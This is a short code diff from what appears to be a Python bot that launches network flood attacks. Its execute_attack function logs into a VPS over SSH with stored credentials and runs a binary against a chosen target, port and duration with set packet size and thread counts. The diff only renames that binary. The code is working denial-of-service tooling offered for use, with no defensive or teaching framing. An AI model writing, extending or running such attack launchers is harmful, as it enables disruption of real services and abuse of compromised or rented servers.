@@ -247,7 +247,7 @@ def execute_attack(vps, target, port, duration, chat_id):
     """Execute an attack on the target using the selected VPS."""
     global TOTAL_PACKET_SIZE
     ip, user, password = vps["ip"], vps["user"], vps["password"]
-    attack_command = f"./Rahul Bhai  {target} {port} {duration} {DEFAULT_PACKET_SIZE} {DEFAULT_THREADS}"
+    attack_command = f"./raja {target} {port} {duration} {DEFAULT_PACKET_SIZE} {DEFAULT_THREADS}"
 
     try:
         ssh = paramiko.SSHClient()
